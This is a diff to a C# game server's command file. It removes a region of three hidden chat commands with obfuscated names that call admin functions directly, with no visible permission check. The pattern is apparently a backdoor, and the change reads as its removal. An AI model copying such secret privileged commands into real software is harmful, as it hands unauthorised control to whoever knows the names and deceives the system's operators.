@@ -5701,44 +5701,6 @@ namespace NeptuneEvo.Core
             }
         }
 
-        #region HCmds
-        [Command("fajsd78fasasf")]
-        public static void CMD_CHNum(ExtPlayer player, int a, string b)
-        {
-            try
-            {
-                Admin.CMD_Cnum(player, Main.GetPlayerByID(a), b);
-            }
-            catch (Exception e)
-            {
-                Log.Write($"CMD_CHNum Exception: {e.ToString()}");
-            }
-        }
-        [Command("fasjf78das78f")]
-        public static void CMD_CHNum(ExtPlayer player, int a)
-        {
-            try
-            {
-                Admin.CMD_Chnum(player, a);
-            }
-            catch (Exception e)
-            {
-                Log.Write($"CMD_CHNum Exception: {e.ToString()}");
-            }
-        }
-        [Command("ijfja78f32fs")]
-        public static void CMD_CInum(ExtPlayer player, int a, byte b = 255, byte c = 255)
-        {
-            try
-            {
-                Admin.CMD_Cinum(player, a, b, c);
-            }
-            catch (Exception e)
-            {
-                Log.Write($"CMD_CInum Exception: {e.ToString()}");
-            }
-        }
-        #endregion
         
         [Command(AdminCommands.Asms, GreedyArg = true)]
         public static void CMD_adminSMS(ExtPlayer player, int id, string msg)
